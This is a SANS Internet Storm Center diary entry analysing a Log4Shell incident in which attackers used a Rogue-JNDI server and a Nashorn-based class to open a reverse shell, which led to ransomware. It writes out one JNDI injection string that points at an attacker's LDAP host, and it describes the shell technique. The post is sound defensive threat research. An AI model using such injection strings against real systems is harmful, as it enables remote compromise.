---
title: Log4Shell campaigns are using Nashorn to get reverse shell on victim's machines, (Mon, Nov 21st)
url: https://isc.sans.edu/diary/rss/29266
source: SANS Internet Storm Center, InfoCON: green
date: 2022-11-22
fetch_date: 2025-10-03T23:25:26.311352
---

# Log4Shell campaigns are using Nashorn to get reverse shell on victim's machines, (Mon, Nov 21st)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/29264)
* [next](/diary/29268)

# [Log4Shell campaigns are using Nashorn to get reverse shell on victim's machines](/forums/diary/Log4Shell%2Bcampaigns%2Bare%2Busing%2BNashorn%2Bto%2Bget%2Breverse%2Bshell%2Bon%2Bvictims%2Bmachines/29266/)

**Published**: 2022-11-21. **Last Updated**: 2022-11-21 20:48:27 UTC
**by** [Renato Marinho](/handler_list.html#renato-marinho) (Version: 1)

[0 comment(s)](/diary/Log4Shell%2Bcampaigns%2Bare%2Busing%2BNashorn%2Bto%2Bget%2Breverse%2Bshell%2Bon%2Bvictims%2Bmachines/29266/#comments)

Almost one year later, Log4Shell attacks are still alive and making victims. Log4shell, as you may remember, was the name given to a remote code execution (RCE) vulnerability in the Apache Log4j Java library, first known on December 10th, 2021.  Information on the zero-day (CVE-2021-44228) and malicious campaigns using it were covered here in SANS ISC in different diaries like [here](https://isc.sans.edu/diary/RCE%2Bin%2Blog4j%2BLog4Shell%2Bor%2Bhow%2Bthings%2Bcan%2Bget%2Bbad%2Bquickly/28120) and [here](https://isc.sans.edu/diary/Log4Shell%2BAttacks%2BGetting%2BSmarter/28246).

In an incident case I got last week, attackers started a reverse shell on the victim’s machine in a way I have not seen in Log4Shell exploitations. The reverse shell was issued using Nashorn, a JavaScript scripting engine used to execute JavaScript code dynamically at JVM. Similar use of Nashorn was seen in [Confluence CVE-2022-26134 exploitations](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/).

**Remembering Log4Shell**

Log4Shell exploitation involves making a JNDI (Java Naming and Directory Interface) address reach the vulnerable Log4j library. Due to the vulnerability, Log4j will look up the JNDI address, which will usually host a malicious Java Class that will be downloaded and executed locally. The malicious Java Class may deploy a crypto miner, for example, or may start a reverse shell, which will allow the attacker to take control of the remote system.

From a historical perspective, immediately after the Log4Shell publication, we noticed many campaigns trying to exploit the vulnerability. But, as time passes, and the vulnerability was ~~exploited~~ fixed on most of the vulnerable hosts, it is common for attackers to lose interest in it, which is exactly what happened to Log4Shell and reported by Johannes in the diary [The Rise and Fall of log4shell](https://isc.sans.edu/diary/The%2BRise%2Band%2BFall%2Bof%2Blog4shell/28372).

![Grfico, Grfico de linhasDescrio gerada automaticamente](data:image/png;base64...)

**The Nashorn Case**

Although low, the case I dealt with last week shows that interest still exists. Threat actors continue scanning the network for remaining hosts, perhaps betting on situations where a defense (IPS) has stopped working or a host that “had not been patched because it was internal” has now been published. In either case, they found a vulnerable host, resulting in a big ransomware infection on the victim’s network.

The attacker’s backend was based on the project Rogue-JNDI (<https://github.com/veracode-research/rogue-jndi>). This project provides HTTP and LDAP servers for exploiting insecure/vulnerable Java JNDI API. In the Figure below, there is an example of how the server can be started.

![Interface grfica do usurio, Texto, AplicativoDescrio gerada automaticamente](data:image/png;base64...)

On the victim’s end, depending on the exploited system, the attacker must make a call to the proper remote address. For example, to exploit a system based on Tomcat the address would be ‘jndi:ldap://192.168.1.10:1389/o=tomcat’.

In the analyzed case, instead of using the default project Tomcat class, attackers used a custom class that implements the Nashorn code, as seen in the Figure below.  Notice that the intent of the JavaScript code is to spawn cmd.exe on port TCP/443 of the attacker’s host.

![](https://isc.sans.edu/diaryimages/images/tomcat.png)

Replaying the attack scenario in a lab, it is possible to see how the malicious class is serialized to be later loaded by the vulnerable Log4j library.

![](https://isc.sans.edu/diaryimages/images/tomcat2(2).png)

Decoding the Base64, we have access to the JavaScript code:

![](https://isc.sans.edu/diaryimages/images/tomcat3.png)

--
Renato Marinho
[Morphus Labs](http://morphuslabs.com)| [LinkedIn](http://ow.ly/Nst730dJ6X3)|[Twitter](http://ow.ly/uXqT30dJ6Tp)

Keywords:

[0 comment(s)](/diary/Log4Shell%2Bcampaigns%2Bare%2Busing%2BNashorn%2Bto%2Bget%2Breverse%2Bshell%2Bon%2Bvictims%2Bmachines/29266/#comments)

* [previous](/diary/29264)
* [next](/diary/29268)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)